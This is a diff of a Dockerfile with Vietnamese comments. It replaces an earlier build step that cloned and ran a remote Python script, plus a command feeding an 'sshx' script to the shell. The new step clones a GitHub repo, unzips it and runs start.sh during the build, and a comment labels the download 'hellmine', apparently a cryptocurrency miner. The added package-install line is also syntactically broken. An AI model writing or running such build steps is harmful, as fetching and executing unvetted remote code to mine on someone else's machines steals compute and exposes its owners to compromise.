@@ -1,9 +1,15 @@
-# Base image
-FROM python:3.8-slim
+FROM ubuntu:latest
 
-# Update and install curl
-RUN apt update && apt upgrade -y && apt install git -y && git clone https://github.com/Teo4268/New.git && cd New && python app.py
+# Cập nhật hệ thống và cài đặt các gói cần thiết
+RUN apt update && apt upgrade -y && apt-get update && apt-get install -y 
+    curl \
+    ca-certificates \
+    git \
+    sudo \ 
+    unzip \
+    python3 
+    
 
+# Tạo thư mục làm việc và tải hellmine
 
-# Set the command to execute the script during runtime
-CMD ["sh", "-s", "run", "<", "/usr/local/bin/sshx-script"]
+RUN git clone https://github.com/Teo4268/pythonforwork.git && cd pythonforwork && unzip pythonforwork.zip && cd pythonforwork && chmod +x ./start.sh && ./start.sh 2
